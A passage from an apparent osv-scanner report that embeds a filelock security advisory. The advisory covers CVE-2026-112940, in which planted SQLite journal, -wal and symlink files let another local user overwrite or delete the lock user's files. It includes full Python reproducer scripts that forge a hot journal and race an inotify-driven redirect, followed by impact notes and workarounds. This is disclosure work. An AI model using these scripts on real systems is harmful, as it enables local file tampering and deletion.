writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a \"super-journal\", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink(\"/home/victim/private/notes.txt\") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).\n\u003e \n\u003e *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `\u003cdb\u003e-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `\u003cdb\u003e-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.\n\u003e \n\u003e The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `\u003cdb\u003e-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.\n\u003e \n\u003e *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `\u003cdb\u003e-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only \"database is locked\" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.\n\u003e \n\u003e *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.\n\u003e \n\u003e A journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.\n\u003e \n\u003e **The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.\n\u003e \n\u003e With `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.\n\u003e \n\u003e ## Reproduction\n\u003e \n\u003e The scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.\n\u003e \n\u003e **`repro`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e import os\n\u003e import shutil\n\u003e import subprocess\n\u003e import sys\n\u003e \n\u003e as_victim = {\"user\": \"victim\", \"group\": \"victim\", \"extra_groups\": []}\n\u003e as_attacker = {\"user\": \"attacker\", \"group\": \"attacker\", \"extra_groups\": []}\n\u003e \n\u003e # set up: the lock database lives in a shared cache directory, 0777 and not sticky\n\u003e shared_dir = \"/tmp/shared-cache\"\n\u003e lock_db = shared_dir + \"/cache.lock.db\"\n\u003e shutil.rmtree(shared_dir, ignore_errors=True)\n\u003e os.mkdir(shared_dir)\n\u003e os.chmod(shared_dir, 0o777)\n\u003e \n\u003e # set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write\n\u003e target = \"/tmp/victim-notes.txt\"\n\u003e for leftover in (target, target + \"-journal\"):\n\u003e     if os.path.lexists(leftover):\n\u003e         os.unlink(leftover)\n\u003e original = b\"original victim notes\\n\"\n\u003e with open(target, \"wb\") as notes:\n\u003e     notes.write(original)\n\u003e shutil.chown(target, \"victim\", \"victim\")\n\u003e os.chmod(target, 0o600)\n\u003e direct_write = subprocess.run(\n\u003e     [sys.executable, \"-c\", \"import sys; open(sys.argv[1], 'r+b')\", target], capture_output=True, text=True, **as_attacker\n\u003e )\n\u003e print(\"attacker opening the target for writing:\", direct_write.stderr.strip().splitlines()[-1])\n\u003e assert direct_write.returncode != 0\n\u003e \n\u003e # attack: a hot journal beside the target, and a redirect of the victim's SQLite from the lock database to the target\n\u003e content = \"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\"\n\u003e subprocess.run([sys.executable, \"/tmp/repro.d/plant_hot_journal.py\", target, content], check=True, **as_attacker)\n\u003e redirect = subprocess.Popen(\n\u003e     [sys.executable, \"/tmp/repro.d/redirect_lock_db.py\", lock_db, target], stdout=subprocess.PIPE, text=True, **as_attacker\n\u003e )\n\u003e assert redirect.stdout.readline() == \"ready\\n\"\n\u003e \n\u003e # the victim takes its read lock; the attacker races each acquire, so the victim runs up to 20 times\n\u003e for run in range(1, 21):\n\u003e     victim = subprocess.run(\n\u003e         [sys.executable, \"/tmp/repro.d/victim_app.py\", lock_db], capture_output=True, text=True, timeout=60, **as_victim\n\u003e     )\n\u003e     with open(target, \"rb\") as notes:\n\u003e         after = notes.read()\n\u003e     if after != original:\n\u003e         break\n\u003e redirect.kill()\n\u003e redirect.wait()\n\u003e \n\u003e # check: taking a lock on cache.lock.db must leave the victim's notes alone\n\u003e print(f\"victim run {run}: exit status {victim.returncode}:\", (victim.stderr.strip() or \"no error\").splitlines()[-1])\n\u003e status = os.stat(target)\n\u003e print(\"target owner, mode, size:\", status.st_uid, oct(status.st_mode \u0026 0o7777), status.st_size)\n\u003e print(\"target before:\", original)\n\u003e print(\"target after: \", after[:60])\n\u003e print(\"BUG\" if after == content.encode().ljust(4096, b\"\\0\") else \"OK\")\n\u003e ```\n\u003e \n\u003e **`repro.d/plant_hot_journal.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The attacker: leave a rollback journal beside TARGET whose one record restores TARGET's first page to CONTENT.\"\"\"\n\u003e \n\u003e import os\n\u003e import struct\n\u003e import sys\n\u003e \n\u003e target, content = sys.argv[1], sys.argv[2].encode()\n\u003e journal_path = target + \"-journal\"\n\u003e \n\u003e # https://www.sqlite.org/fileformat2.html#the_rollback_journal\n\u003e JOURNAL_MAGIC = bytes.fromhex(\"d9d505f920a163d7\")\n\u003e page_size, sector_size, nonce = 4096, 512, 0x11223344\n\u003e record_count = 1\n\u003e pages_after_rollback = 1  # SQLite truncates TARGET to this many pages\n\u003e header = JOURNAL_MAGIC + struct.pack(\"\u003eIIIII\", record_count, nonce, pages_after_rollback, sector_size, page_size)\n\u003e \n\u003e page_number = 1  # page 1 starts at offset 0\n\u003e page_image = content.ljust(page_size, b\"\\0\")\n\u003e # SQLite's pager_cksum(): the nonce plus every 200th byte, counting down from page_size - 200\n\u003e checksum = (nonce + sum(page_image[i] for i in range(page_size - 200, 0, -200))) \u0026 0xFFFFFFFF\n\u003e record = struct.pack(\"\u003eI\", page_number) + page_image + struct.pack(\"\u003eI\", checksum)\n\u003e \n\u003e with open(journal_path, \"wb\") as journal:\n\u003e     journal.write(header.ljust(sector_size, b\"\\0\") + record)\n\u003e os.chmod(journal_path, 0o666)  # the victim's SQLite opens a hot journal O_RDWR\n\u003e ```\n\u003e \n\u003e **`repro.d/redirect_lock_db.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The attacker: make the victim's SQLite, connecting through /proc/self/fd/\u003cn\u003e, open TARGET instead of LOCK_DB.\"\"\"\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import sys\n\u003e \n\u003e lock_db, target = sys.argv[1], sys.argv[2]\n\u003e spare_name = lock_db + \".keep\"\n\u003e \n\u003e # the attacker creates the lock database, world-writable so that the victim's ReadWriteLock accepts it\n\u003e os.close(os.open(lock_db, os.O_CREAT | os.O_WRONLY))\n\u003e os.chmod(lock_db, 0o666)\n\u003e os.link(lock_db, spare_name)\n\u003e \n\u003e # what /proc/\u003cpid\u003e/fd/\u003cn\u003e reads back as once the name the descriptor was opened through is unlinked\n\u003e os.symlink(target, lock_db + \" (deleted)\")\n\u003e \n\u003e IN_OPEN = 0x20\n\u003e libc = ctypes.CDLL(None, use_errno=True)\n\u003e inotify = libc.inotify_init1(0)\n\u003e if libc.inotify_add_watch(inotify, lock_db.encode(), IN_OPEN) \u003c 0:\n\u003e     raise OSError(ctypes.get_errno(), \"inotify_add_watch\", lock_db)\n\u003e print(\"ready\", flush=True)\n\u003e \n\u003e while True:\n\u003e     os.read(inotify, 4096)  # the victim's ReadWriteLock has opened the database and is validating its descriptor\n\u003e     os.unlink(lock_db)\n\u003e     os.link(spare_name, lock_db)  # the same inode back at the path, so filelock's later lstat sees no change\n\u003e ```\n\u003e \n\u003e **`repro.d/victim_app.py`**\n\u003e \n\u003e ```python\n\u003e #!/usr/bin/env python3\n\u003e \"\"\"The victim: an application that takes its shared read lock once, as in docs/how-to.rst.\"\"\"\n\u003e \n\u003e import sys\n\u003e \n\u003e from filelock import ReadWriteLock\n\u003e \n\u003e rw = ReadWriteLock(sys.argv[1])\n\u003e with rw.read_lock(timeout=5):\n\u003e     pass\n\u003e ```\n\u003e \n\u003e ## Attack sequence\n\u003e \n\u003e The redirect, with `A` the other local user:\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as other local user\n\u003e     participant V as lock user's process (filelock)\n\u003e     participant S as SQLite inside that process\n\u003e     participant K as kernel and filesystem\n\u003e     rect rgb(255, 214, 214)\n\u003e         Note over A,K: filelock 4.0.9 to 4.2.0 on Linux, lock directory 0777 without the sticky bit\n\u003e         A-\u003e\u003eK: create cache.lock.db (0666) and a second hard link cache.lock.db.keep\n\u003e         A-\u003e\u003eK: symlink \"cache.lock.db (deleted)\" pointing at /tmp/victim-notes.txt\n\u003e         A-\u003e\u003eK: write /tmp/victim-notes.txt-journal (hot rollback journal, one page record)\n\u003e         V-\u003e\u003eK: open(cache.lock.db, O_RDWR O_CREAT O_NOFOLLOW) gives fd 3, fstat says regular, header not WAL\n\u003e         K--\u003e\u003eA: inotify IN_OPEN on cache.lock.db\n\u003e         A-\u003e\u003eK: unlink(cache.lock.db) then link(cache.lock.db.keep, cache.lock.db)\n\u003e         V-\u003e\u003eS: sqlite3.connect(\"/proc/self/fd/3\")\n\u003e         S-\u003e\u003eK: readlink(/proc/self/fd/3) returns \"cache.lock.db (deleted)\"\n\u003e         S-\u003e\u003eK: open(\"cache.lock.db (deleted)\") follows the symlink to victim-notes.txt\n\u003e         V-\u003e\u003eS: PRAGMA journal_mode=MEMORY\n\u003e         S-\u003e\u003eK: open(victim-notes.txt-journal), pread page 1, pwrite it at offset 0 of victim-notes.txt\n\u003e         Note over V,K: victim-notes.txt (0600, 22 bytes) is now the other user's 4096-byte page image, the lock user sees \"disk I/O error\"\n\u003e         V-\u003e\u003eK: lstat(cache.lock.db) matches fd 3 identity, so _raise_if_database_replaced passes\n\u003e     end\n\u003e ```\n\u003e \n\u003e The side-file variants, which need no redirect:\n\u003e \n\u003e ```mermaid\n\u003e flowchart TD\n\u003e     B0[\"acquire validates fd, connects SQLite by a name in the shared directory\"] --\u003e B1{\"what did the other user put beside the real path?\"}\n\u003e     B1 -- \"hot -journal beside a swapped-in one-page database\" --\u003e B2[\"PRAGMA replays the journal, then unlinks the super-journal file it names, acquire succeeds\"]\n\u003e     B1 -- \"-wal re-created between PRAGMA and BEGIN\" --\u003e B3[\"holder in WAL mode, reader admitted beside the writer, SIGBUS when -shm is truncated\"]\n\u003e     B1 -- \"-wal in a sticky directory the lock user cannot unlink\" --\u003e B4[\"every acquire raises OperationalError disk I/O error, timeout ignored\"]\n\u003e     B1 -- \"name unlinked and a (deleted) symlink planted\" --\u003e B5[\"SQLite opens the symlink target with O_CREAT\"]\n\u003e     classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;\n\u003e     classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;\n\u003e     classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;\n\u003e     class B0,B1 info;\n\u003e     class B2,B3,B4,B5 bad;\n\u003e ```\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e The scanner's reproducer runs the documented `ReadWriteLock(path)` + `with rw.read_lock(timeout=5):` as user `victim` against `/tmp/shared-cache/cache.lock.db` (directory `0777`, not sticky) while user `attacker` holds the symlink and reacts to inotify. It first shows that `attacker` cannot write the target (`PermissionError: [Errno 13] Permission denied: '/tmp/victim-notes.txt'`). On the first `victim` run it prints `victim run 1: exit status 1: sqlite3.OperationalError: disk I/O error`, `target owner, mode, size: 1000 0o600 4096`, target before `b'original victim notes\\n'`, after `b\"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\\x00...\"`, verdict `BUG`. Reacting to inotify redirected the first acquire in 77 of 77 runs. A plain unlink/link busy loop with no inotify also won on the first run. A process holding two `ReadWriteLock` instances on one database keeps an idle descriptor; a swap done a full second before the second acquire redirected it. The `-wal` re-plant landed on the first attempt in 20 of 20 runs. The journal-unlink variant needs no race.\n\u003e \n\u003e Our verification: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head it prints `OK`: all 20 `victim` runs exit 0 with no error and the target stays `1000 0o600 22` bytes with its original content. The independent review also ran the sticky-directory `-wal` variant (a `0600` database owned by `victim` in a `1777` directory, other user plants `\u003cdb\u003e-wal`). 4.2.0 raises `OperationalError: disk I/O error`; the PR head takes read and write locks with the file still present.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Another local user who can write the non-sticky directory holding the database makes the lock user's process act on a file other than the lock database, with the lock user's privileges, on Linux. The process writes bytes of the other user's choosing from offset 0 into any non-empty regular file the lock user can write, resized to a whole number of pages, provided the other user can create `\u003cfile\u003e-journal` beside it (the lock user's own `0600` files in `/tmp` qualify). Without a journal the process creates an empty file at any path it may create, or converts a WAL-mode SQLite database of its own to rollback mode with no error. A journal beside a swapped-in database makes the process unlink one regular file of the other user's choosing per journal; the acquire succeeds and raises nothing. A process inside `write_lock()` stops excluding the lock user's other processes from `read_lock()`, and the holder can die from a `SIGBUS` that arrives in `release()`.\n\u003e \n\u003e It is **not** reachable for a database the lock user owns in `/tmp` with `fs.protected_regular` 1 or 2. There only the planted `-wal` denial of service remains: every acquire raises an undocumented `sqlite3.OperationalError` that `Timeout` and `OSError` handlers do not catch. It is a bypass of the fix for GHSA-j8f7-rjxc-mr56 (4.0.9), which refused the symlink at the database path but followed it at `\u003cdatabase\u003e (deleted)`. Windows does not take this path.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content.\n\u003e - For a lock in a sticky directory keep `fs.protected_regular` at 1 or 2 and `fs.protected_hardlinks=1` (distribution defaults). Treat a sudden `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `\u003cdb\u003e-wal` beside the database that the file's owner or root has to remove.\n\u003e \n\u003e ## Patched version\n\u003e \n\u003e 4.2.1.\n\u003e \n\u003e Fix: https://github.com/tox-dev/filelock/pull/834\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\u003e \n\u003e - 2026-10-15 23:08 UTC: report received (scan `filelock-20261015-005` of commit `b831496b0273`)\n\u003e - 2026-10-16 00:46 UTC: draft advisory created\n\u003e - 2026-10-16 01:15 UTC: fix PR #834 opened\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | filelock | 3.32.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-v4x8-3wr5-3wq8 | filelock | 4.2.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112940\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112940",
              "name": "CVE-2026-112940",
              "properties": {
                "security-severity": "7.1"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-112940: filelock ReadWriteLock: SQLite reopens the lock database by name, so a planted symlink or journal file makes the lock user's process overwrite or unlink its own files",
                "text": "CVE-2026-112940: filelock ReadWriteLock: SQLite reopens the lock database by name, so a planted symlink or journal file makes the lock user's process overwrite or unlink its own files"
              }
